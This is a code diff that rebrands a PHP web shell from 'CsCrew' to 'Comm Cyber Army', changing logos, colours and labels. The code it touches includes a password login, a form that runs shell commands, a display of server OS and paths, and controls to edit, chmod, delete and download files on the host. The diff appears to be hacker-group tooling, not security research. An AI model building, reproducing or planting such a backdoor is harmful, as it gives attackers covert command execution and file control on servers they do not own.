@@ -82,26 +82,28 @@ if(!isset($_SESSION['authenticated']) || $_SESSION['authenticated']!==true){
     }
     ?>
     <!doctype html><html lang="en"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/>
-    <title>Login - CsCrew</title>
+    <title>Login - Comm Cyber Army</title>
     <style>
         body{background:#000;color:#fff;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}
-        .login-container{background:#111;padding:2rem;border:1px solid #b30000;border-radius:5px;width:320px;text-align:center;}
-        .login-container h2{margin-top:0;color:#b30000;}
-        .login-form input{width:100%;padding:10px;margin:10px 0;background:#000;border:1px solid #b30000;color:#fff;border-radius:3px;}
-        .login-form button{background:#b30000;color:#fff;border:none;padding:10px 20px;cursor:pointer;width:100%;border-radius:3px;font-weight:bold;}
-        .login-form button:hover{background:#800000;}
-        .error{color:#b30000;margin:10px 0;}
-        .logo-login{height:80px;margin-bottom:20px;border-radius:6px;display:block;margin-left:auto;margin-right:auto;}
+        .login-container{background:#111;padding:2rem;border:1px solid #fff;border-radius:5px;width:320px;text-align:center;}
+        .login-container h2{margin-top:0;color:#fff;font-weight:bold;}
+        .login-form input{width:calc(100% - 22px);padding:10px;margin:10px 0;background:#000;border:1px solid #fff;color:#fff;border-radius:3px;}
+        .login-form button{background:#fff;color:#000;border:none;padding:10px 20px;cursor:pointer;width:100%;border-radius:3px;font-weight:bold;}
+        .login-form button:hover{background:#ccc;}
+        .error{color:#ff4444;margin:10px 0;}
+        .logo-login{height:80px;margin-bottom:20px;display:block;margin-left:auto;margin-right:auto;}
+        .cca-text{color:#fff;font-size:12px;margin-top:15px;font-weight:bold;}
     </style>
     </head><body>
     <div class="login-container">
-        <img src="https://i.ibb.co/nsV8Q32t/20250621-011746.png" alt="Logo" class="logo-login"/>
-        <h2>CsCrew Login</h2>
+        <img src="https://k.top4top.io/p_3566ekonh0.png" alt="CCA Logo" class="logo-login"/>
+        <h2>COMM CYBER ARMY</h2>
         <?php if(isset($login_error)) echo '<div class="error">'.htmlspecialchars($login_error).'</div>'; ?>
         <form class="login-form" method="post" autocomplete="off" autofocus>
-            <input type="password" name="pass" placeholder="Kata Laluan" required/>
-            <button type="submit">Login</button>
+            <input type="password" name="pass" placeholder="Enter Password" required/>
+            <button type="submit">ACCESS SYSTEM</button>
         </form>
+        <div class="cca-text">COMM CYBER ARMY - SECURE ACCESS</div>
     </div>
     </body></html><?php exit();
 }
@@ -226,14 +228,14 @@ if(isset($_POST['q'])){
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>CsCrew File Manager</title>
+<title>Comm Cyber Army File Manager</title>
 <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css"/>
 <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"/>
 <style>
 body {background:#000;color:#fff;font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;margin:0;padding:0;}
 header {
-    background:#222;
-    border-bottom:4px solid #b30000;
+    background:#111;
+    border-bottom:2px solid #fff;
     padding:15px 30px;
     display:flex;
     flex-wrap:wrap;
@@ -243,15 +245,15 @@ header {
     user-select:none;
 }
 header .logo-container {flex: 0 0 auto;margin-right: 20px;}
-header .logo-container img {height: 90px;border-radius: 6px;display:block;}
-header h1 {font-size: 2.8rem;margin:0;flex:1 1 auto;letter-spacing:1.2px;color:#b30000;}
+header .logo-container img {height: 90px;display:block;}
+header h1 {font-size: 2.8rem;margin:0;flex:1 1 auto;letter-spacing:1.2px;color:#fff;}
 header .server-info {
     flex:1 1 100%;
     font-size:0.9rem;
     margin-top:8px;
     white-space: pre-line;
     color:#ccc;
-    border:1px solid #b30000;
+    border:1px solid #fff;
     padding:10px;
     border-radius:4px;
     max-width:100%;
@@ -259,7 +261,7 @@ header .server-info {
     user-select:text;
     cursor:default;
 }
-header .server-info:hover {background-color:rgba(179,0,0,0.1);color:#fff;}
+header .server-info:hover {background-color:rgba(255,255,255,0.1);color:#fff;}
 header .current-path {
     flex:1 1 100%;
     margin-top:8px;
@@ -267,6 +269,7 @@ header .current-path {
     font-size:1rem;
     text-align:left;
     word-break:break-word;
+    color:#ffffff;
 }
 header .current-path a {
     color:#fff;
@@ -274,7 +277,7 @@ header .current-path a {
     margin-right:7px;
     font-weight:500;
 }
-header .current-path a:hover {color:#ff9999;text-decoration:underline;}
+header .current-path a:hover {color:#00ff00;text-decoration:underline;}
 #cmd-form {
     flex:1 1 100%;
     margin-top:15px;
@@ -286,7 +289,7 @@ header .current-path a:hover {color:#ff9999;text-decoration:underline;}
     flex:1;
     padding:10px 15px;
     border-radius:4px;
-    border:1px solid #b30000;
+    border:1px solid #fff;
     background:#000;
     color:#fff;
     font-family: monospace;
@@ -294,39 +297,37 @@ header .current-path a:hover {color:#ff9999;text-decoration:underline;}
 }
 #cmd-form input[type="text"]:focus {
     outline:none;
-    border-color:#ff4d4d;
+    border-color:#00ff00;
 }
 #cmd-form button {
-    background:#b30000;
-    color:#fff;
+    background:#fff;
+    color:#000;
     border:none;
     padding:10px 25px;
     border-radius:4px;
     cursor:pointer;
     font-weight:700;
-    transition:background-color 0.3s ease;
 }
-#cmd-form button:hover {background:#800000;}
+#cmd-form button:hover {background:#ccc;}
 .logout-btn {
     position:fixed;
     top:10px;
     right:10px;
     z-index:9999;
-    background:#b30000;
-    color:#fff;
+    background:#fff;
+    color:#000;
     padding:7px 14px;
     border-radius:4px;
     font-weight:700;
     border:1px solid #fff;
     text-decoration:none;
-    transition:background-color 0.3s ease;
     user-select:none;
 }
-.logout-btn:hover {background:#800000;color:#fff;}
+.logout-btn:hover {background:#ccc;color:#000;}
 a {color:#fff;transition:color 0.3s ease;}
-a:hover {color:#ff9999;text-decoration:none;}
-.table-hover tbody tr:hover td {background:#b30000;}
-.table-hover tbody tr:hover td > * {color:#fff;}
+a:hover {color:#00ff00;text-decoration:none;}
+.table-hover tbody tr:hover td {background:rgba(255,255,255,0.1);}
+.table-hover tbody tr:hover td > * {color:#ffffff;}
 .table > tbody > tr > * {
     color:#fff;
     vertical-align:middle;
@@ -335,24 +336,29 @@ a:hover {color:#ff9999;text-decoration:none;}
 .form-control {
     background:transparent !important;
     color:#fff !important;
-    border-radius:0;
-    border:1px solid #b30000 !important;
+    border-radius:4px;
+    border:1px solid #fff !important;
 }
-.form-control::placeholder {color:#fff;opacity:1;}
+.form-control:focus {
+    background:transparent !important;
+    color:#fff !important;
+    border-color:#00ff00 !important;
+}
+.form-control::placeholder {color:#ccc;opacity:1;}
 .btn-outline-light {
     color:#fff;
-    border-color:#b30000;
+    border-color:#fff;
 }
 .btn-outline-light:hover {
-    background-color:#b30000;
-    border-color:#b30000;
-    color:#fff;
+    background-color:#fff;
+    border-color:#fff;
+    color:#000;
 }
 .custom-file-label {
     background-color: transparent !important;
     color: #fff !important;
-    border: 1px solid #b30000 !important;
-    border-radius: 0;
+    border: 1px solid #fff !important;
+    border-radius: 4px;
 }
 #uploadForm {margin-bottom:1rem;}
 #createFormArea {
@@ -364,10 +370,14 @@ a:hover {color:#ff9999;text-decoration:none;}
 #createFormArea form {
     flex: 1;
     min-width: 200px;
+    background:rgba(255,255,255,0.05);
+    padding:15px;
+    border-radius:6px;
+    border:1px solid #fff;
 }
 #actionArea {
     background-color: #111;
-    border: 2px solid #b30000;
+    border: 1px solid #fff;
     border-radius: 6px;
     padding: 15px 20px;
     margin: 15px 0 0 0;
@@ -375,17 +385,24 @@ a:hover {color:#ff9999;text-decoration:none;}
 }
 /* Wrapper container for main content to align spacing left-right with footer */
 #mainContentWrapper {
-    margin: 15px 30px 30px 30px; /* top 15, right 30, bottom 30, left 30 */
+    margin: 15px 30px 30px 30px;
     min-height: 60vh;
 }
-/* Table container style inside main content - tambah padding kiri lebih besar agar isi bergeser ke kanan */
+/* Table container style inside main content */
 .table-container {
-    background-color: #121212;
-    border: 2px solid #b30000;
+    background-color: #111;
+    border: 1px solid #fff;
     border-radius: 6px;
-    padding: 1rem 1rem 1rem 3rem; /* top right bottom left */
+    padding: 1rem 1rem 1rem 3rem;
     overflow-x: auto;
 }
+.table thead th {
+    border-bottom: 1px solid #fff;
+    color: #fff;
+    font-weight: bold;
+}
+.fa-folder { color: #fff; }
+.fa-file { color: #fff; }
 @media(max-width:768px){
     header {
         flex-direction: column;
@@ -427,19 +444,19 @@ a:hover {color:#ff9999;text-decoration:none;}
         margin: 15px 15px 30px 15px;
     }
     .table-container {
-        padding-left: 1.5rem; /* sedikit kecilkan padding kiri pada layar kecil */
+        padding-left: 1.5rem;
     }
 }
 </style>
 <script src="//unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
 </head><body>
-<a href="?logout" class="logout-btn" title="Logout"><i class="fa fa-sign-out"></i> Logout</a>
+<a href="?logout" class="logout-btn" title="Logout"><i class="fa fa-sign-out"></i> LOGOUT</a>
 
 <header>
-    <div class="logo-container" title="CsCrew Logo">
-        <img src="https://i.ibb.co/nsV8Q32t/20250621-011746.png" alt="Logo" />
+    <div class="logo-container" title="CCA Logo">
+        <img src="https://k.top4top.io/p_3566ekonh0.png" alt="CCA Logo" />
     </div>
-    <h1>CsCrew File Manager</h1>
+    <h1>COMM CYBER ARMY</h1>
     <div class="server-info" title="PHP Version, Server OS, Server Time, Document Root"><?= "PHP Version: ".phpversion()."\nServer OS: ".php_uname()."\nServer Time: ".date("Y-m-d H:i:s")."\nDocument Root: ".$_SERVER['DOCUMENT_ROOT'] ?></div>
     <div class="current-path" title="Current Path"><?= path_links($p) ?></div>
 
@@ -455,9 +472,9 @@ a:hover {color:#ff9999;text-decoration:none;}
 
     <!-- Command form -->
     <form id="cmd-form" method="post" autocomplete="off" title="Run shell command" style="margin-top:15px; display:flex; gap:10px;">
-        <input type="text" name="q" placeholder="Enter command..." autofocus style="flex:1; padding:10px 15px; border-radius:4px; border:1px solid #b30000; background:#000; color:#fff; font-family: monospace; font-size: 1rem;" />
-        <button type="submit" title="Run Command" style="background:#b30000; border:none; padding:10px 25px; border-radius:4px; color:#fff; font-weight:700; cursor:pointer;">
-            <i class="fa fa-terminal"></i> Run
+        <input type="text" name="q" placeholder="Enter command..." autofocus style="flex:1; padding:10px 15px; border-radius:4px; border:1px solid #fff; background:#000; color:#fff; font-family: monospace; font-size: 1rem;" />
+        <button type="submit" title="Run Command" style="background:#fff; border:none; padding:10px 25px; border-radius:4px; color:#000; font-weight:700; cursor:pointer;">
+            <i class="fa fa-terminal"></i> EXECUTE
         </button>
     </form>
 </header>
@@ -467,18 +484,18 @@ a:hover {color:#ff9999;text-decoration:none;}
     <form method="post">
         <input type="hidden" name="type" value="file"/>
         <div class="form-group">
-            <label>Create New File</label>
+            <label style="color:#fff; font-weight:bold;">Create New File</label>
             <input type="text" name="filename" class="form-control" placeholder="File name" required />
         </div>
-        <button type="submit" name="create_submit" class="btn btn-outline-light btn-block">Create File</button>
+        <button type="submit" name="create_submit" class="btn btn-outline-light btn-block">CREATE FILE</button>
     </form>
     <form method="post">
         <input type="hidden" name="type" value="directory"/>
         <div class="form-group">
-            <label>Create New Folder</label>
+            <label style="color:#fff; font-weight:bold;">Create New Folder</label>
             <input type="text" name="filename" class="form-control" placeholder="Folder name" required />
         </div>
-        <button type="submit" name="create_submit" class="btn btn-outline-light btn-block">Create Folder</button>
+        <button type="submit" name="create_submit" class="btn btn-outline-light btn-block">CREATE FOLDER</button>
     </form>
 </div>
 
@@ -489,11 +506,11 @@ if($action==='rename' && $fileNameParam!==''){ ?>
     <form method="post">
         <input type="hidden" name="old_name" value="<?=htmlspecialchars($fileNameParam)?>" />
         <div class="form-group">
-            <label>Rename <?=is_dir($p.DIRECTORY_SEPARATOR.$fileNameParam) ? "Directory" : "File"?>: <?=htmlspecialchars($fileNameParam)?></label>
+            <label style="color:#fff;">Rename <?=is_dir($p.DIRECTORY_SEPARATOR.$fileNameParam) ? "Directory" : "File"?>: <?=htmlspecialchars($fileNameParam)?></label>
             <input type="text" name="new_name" class="form-control" required autofocus />
         </div>
-        <button type="submit" name="rename_submit" class="btn btn-outline-light">Rename</button>
-        <a href="?p=<?=hex($p)?>" class="btn btn-outline-light ml-2">Cancel</a>
+        <button type="submit" name="rename_submit" class="btn btn-outline-light">RENAME</button>
+        <a href="?p=<?=hex($p)?>" class="btn btn-outline-light ml-2">CANCEL</a>
     </form>
 <?php }elseif($action==='chmod' && $fileNameParam!==''){
     $fp = $p.DIRECTORY_SEPARATOR.$fileNameParam;
@@ -501,11 +518,11 @@ if($action==='rename' && $fileNameParam!==''){ ?>
     <form method="post">
         <input type="hidden" name="chmod_file" value="<?=htmlspecialchars($fileNameParam)?>" />
         <div class="form-group">
-            <label>Change Permissions for: <?=htmlspecialchars($fileNameParam)?></label>
+            <label style="color:#fff;">Change Permissions for: <?=htmlspecialchars($fileNameParam)?></label>
             <input type="text" name="chmod_mode" class="form-control" value="<?=$cur_perm?>" pattern="[0-7]{3,4}" title="Enter octal permission (e.g. 0755)" required autofocus />
         </div>
-        <button type="submit" name="chmod_submit" class="btn btn-outline-light">Change Permission</button>
-        <a href="?p=<?=hex($p)?>" class="btn btn-outline-light ml-2">Cancel</a>
+        <button type="submit" name="chmod_submit" class="btn btn-outline-light">CHANGE PERMISSION</button>
+        <a href="?p=<?=hex($p)?>" class="btn btn-outline-light ml-2">CANCEL</a>
     </form>
 <?php }elseif($action==='edit' && $fileNameParam!==''){
     $fp = $p.DIRECTORY_SEPARATOR.$fileNameParam;
@@ -514,14 +531,14 @@ if($action==='rename' && $fileNameParam!==''){ ?>
         <form method="post">
             <input type="hidden" name="edit_file" value="<?=htmlspecialchars($fileNameParam)?>">
             <div class="form-group">
-                <label>Edit File: <?=htmlspecialchars($fileNameParam)?></label>
-                <textarea name="edit_content" class="form-control" rows="15" style="font-family: monospace; font-size: 0.9rem;"><?=htmlspecialchars($content)?></textarea>
+                <label style="color:#fff;">Edit File: <?=htmlspecialchars($fileNameParam)?></label>
+                <textarea name="edit_content" class="form-control" rows="15" style="font-family: monospace; font-size: 0.9rem; background:#000 !important;"><?=htmlspecialchars($content)?></textarea>
             </div>
-            <button type="submit" name="edit_submit" class="btn btn-outline-light">Save File</button>
-            <a href="?p=<?=hex($p)?>" class="btn btn-outline-light ml-2">Cancel</a>
+            <button type="submit" name="edit_submit" class="btn btn-outline-light">SAVE FILE</button>
+            <a href="?p=<?=hex($p)?>" class="btn btn-outline-light ml-2">CANCEL</a>
         </form> <?php
     } else {
-        echo '<p>File not found.</p>';
+        echo '<p style="color:#ff4444;">File not found.</p>';
     }
 }
 ?>
@@ -532,7 +549,7 @@ if($action==='rename' && $fileNameParam!==''){ ?>
     <div class="table-container">
     <?php
     if(isset($output_cmd)) {
-        echo '<div class="bg-black p-3 mb-3" style="font-family: monospace; white-space: pre-wrap; max-height: 300px; overflow:auto; border: 1px solid #b30000; border-radius:4px;">';
+        echo '<div class="bg-black p-3 mb-3" style="font-family: monospace; white-space: pre-wrap; max-height: 300px; overflow:auto; border: 1px solid #fff; border-radius:4px; background:#000 !important;">';
         echo htmlspecialchars($output_cmd);
         echo '</div>';
     }
@@ -551,7 +568,7 @@ if($action==='rename' && $fileNameParam!==''){ ?>
         <?php
         $parent = dirname($p);
         if ($parent !== $p && is_dir($parent)) {
-            echo '<tr><td><a href="?p='.bin2hex(realpath($parent)).'"><i class="fa fa-fw fa-level-up"></i> .. (Parent Directory)</a></td><td>N/A</td><td></td><td></td></tr>';
+            echo '<tr><td><a href="?p='.bin2hex(realpath($parent)).'"><i class="fa fa-fw fa-level-up" style="color:#fff;"></i> .. (Parent Directory)</a></td><td>N/A</td><td></td><td></td></tr>';
         }
         foreach($items as $item){
             $fp = $p.DIRECTORY_SEPARATOR.$item;
@@ -566,12 +583,12 @@ if($action==='rename' && $fileNameParam!==''){ ?>
                 echo '<td><a href="#" class="preview-file" data-file="'.htmlspecialchars($fp).'" data-ext="'.$ext.'" title="Last modified: '.date("Y-m-d H:i",filemtime($fp)).'"><i class="fa fa-fw fa-file"></i> '.htmlspecialchars($item).'</a></td>';
             }
             echo "<td>{$size}</td>";
-            echo '<td><font color="#b30000">'.$perm.'</font></td>';
+            echo '<td><font color="#00ff00">'.$perm.'</font></td>';
             echo '<td>
-                <a href="?p='.bin2hex(realpath($p)).'&a='.hex('edit').'&n='.hex($item).'" title="Edit"><i class="fa fa-fw fa-edit"></i></a>
-                <a href="?p='.bin2hex(realpath($p)).'&a='.hex('rename').'&n='.hex($item).'" title="Rename"><i class="fa fa-fw fa-pencil"></i></a>
-                <a href="?p='.bin2hex(realpath($p)).'&a='.hex('chmod').'&n='.hex($item).'" title="Change Permission"><i class="fa fa-fw fa-lock"></i></a>
-                <a href="?p='.bin2hex(realpath($p)).'&a='.hex('delete').'&n='.hex($item).'" class="delete" data-type="'.($isDir?'folder':'file').'" title="Delete"><i class="fa fa-fw fa-trash"></i></a>
+                <a href="?p='.bin2hex(realpath($p)).'&a='.hex('edit').'&n='.hex($item).'" title="Edit" style="margin-right:8px;"><i class="fa fa-fw fa-edit"></i></a>
+                <a href="?p='.bin2hex(realpath($p)).'&a='.hex('rename').'&n='.hex($item).'" title="Rename" style="margin-right:8px;"><i class="fa fa-fw fa-pencil"></i></a>
+                <a href="?p='.bin2hex(realpath($p)).'&a='.hex('chmod').'&n='.hex($item).'" title="Change Permission" style="margin-right:8px;"><i class="fa fa-fw fa-lock"></i></a>
+                <a href="?p='.bin2hex(realpath($p)).'&a='.hex('delete').'&n='.hex($item).'" class="delete" data-type="'.($isDir?'folder':'file').'" title="Delete" style="margin-right:8px;"><i class="fa fa-fw fa-trash"></i></a>
                 <a href="?p='.bin2hex(realpath($p)).'&download='.hex($item).'" title="Download"><i class="fa fa-fw fa-download"></i></a>
             </td>';
             echo '</tr>';
@@ -583,21 +600,21 @@ if($action==='rename' && $fileNameParam!==''){ ?>
     </div>
 </div>
 
-<div class="bg-dark border text-center mt-2 p-2" style="margin: 0 30px;">
-    <small>Created By CsCrew</small>
+<div class="bg-dark border text-center mt-2 p-2" style="margin: 0 30px; border-color:#fff !important;">
+    <small style="color:#fff; font-weight:bold;">COMM CYBER ARMY &copy; 2024 - SECURE FILE MANAGEMENT SYSTEM</small>
 </div>
 
 <!-- Preview Modal -->
 <div class="modal fade" id="previewModal" tabindex="-1" aria-labelledby="previewModalLabel" aria-hidden="true">
     <div class="modal-dialog modal-lg modal-dialog-scrollable">
         <div class="modal-content bg-dark text-white">
-            <div class="modal-header">
-                <h5 class="modal-title" id="previewModalLabel">Preview File</h5>
+            <div class="modal-header" style="border-bottom:1px solid #fff;">
+                <h5 class="modal-title" id="previewModalLabel" style="color:#fff;">Preview File</h5>
                 <button type="button" class="close btn-close-white" data-dismiss="modal" aria-label="Close"><span
-                            aria-hidden="true" style="color: white;">&times;</span></button>
+                            aria-hidden="true" style="color: #fff;">&times;</span></button>
             </div>
             <div class="modal-body" id="previewContent"
-                 style="white-space: pre-wrap; font-family: monospace; max-height: 70vh; overflow:auto;">
+                 style="white-space: pre-wrap; font-family: monospace; max-height: 70vh; overflow:auto; background:#000;">
                 Loading preview...
             </div>
         </div>
@@ -616,8 +633,8 @@ if($action==='rename' && $fileNameParam!==''){ ?>
         e.preventDefault();
         let url = $(this).attr('href');
         swal({
-            title: "Are you sure?",
-            text: "This action will delete the selected item.",
+            title: "CONFIRM DELETE",
+            text: "This action cannot be undone!",
             icon: "warning",
             buttons: true,
             dangerMode: true,
